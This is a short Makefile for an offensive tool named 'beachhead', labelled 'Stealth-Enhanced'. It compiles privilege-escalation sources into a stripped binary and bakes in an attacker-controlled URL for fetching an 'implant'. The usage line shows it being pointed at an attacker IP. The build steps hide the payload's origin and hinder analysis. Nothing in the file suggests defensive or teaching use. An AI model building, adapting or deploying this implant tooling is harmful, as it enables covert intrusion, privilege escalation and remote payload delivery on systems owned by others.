# Beachhead Makefile (Stealth-Enhanced)
# Usage: make URL="http://<attacker_ip>/implant"

URL ?= "http://10.37.1.249/implant"

CXX = g++
CXXFLAGS = -O3 -s -Wall -Wextra -fno-stack-protector \
           -ffunction-sections -fdata-sections -DURL='$(URL)'
LDFLAGS = -Wl,--gc-sections

TARGET = beachhead
SRCS = beachhead.cpp privesc_check.cpp privesc.cpp
OBJS = $(SRCS:.cpp=.o)

all: $(TARGET)

$(TARGET): $(OBJS)
	$(CXX) $(CXXFLAGS) -o $(TARGET) $(OBJS) $(LDFLAGS)
	strip --strip-all $(TARGET)

%.o: %.cpp privesc_check.h privesc.h
	$(CXX) $(CXXFLAGS) -c $< -o $@

clean:
	rm -f $(TARGET) $(OBJS)

.PHONY: all clean
